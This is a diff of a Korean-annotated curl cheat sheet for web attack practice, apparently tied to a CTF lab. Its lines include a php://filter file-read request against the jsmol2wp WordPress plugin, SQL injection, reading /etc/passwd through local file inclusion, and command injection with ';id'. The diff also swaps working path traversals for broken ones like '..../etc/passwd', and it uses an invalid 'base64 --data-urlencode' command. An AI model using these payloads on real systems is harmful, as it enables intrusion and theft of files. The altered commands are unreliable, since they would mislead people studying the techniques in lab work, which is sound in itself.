@@ -21,7 +21,7 @@ curl -k https://target.com             # TLS 인증서 무시
 # 리디렉션으로 파일 저장 후 base64 디코딩
 # 자동으로 --data-urlencode 인코딩 -> <script>alert('XSS')</script> -> %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
 
-curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=.../hello.php" > hello.b64
 base64 --data-urlencode hello.b64 > hello.php
 ```
 
@@ -89,7 +89,7 @@ curl --socks5 127.0.0.1:9050 http://target.com   # SOCKS5 프록시 (Tor)
 curl "http://target.com/search.php?id=1 OR 1=1--"
 
 # LFI
-curl "http://target.com/page.php?file=../../../etc/passwd"
+curl "http://target.com/page.php?file=..../etc/passwd"
 
 # 명령어 인젝션
 curl "http://target.com/ping.php?host=127.0.0.1;id"
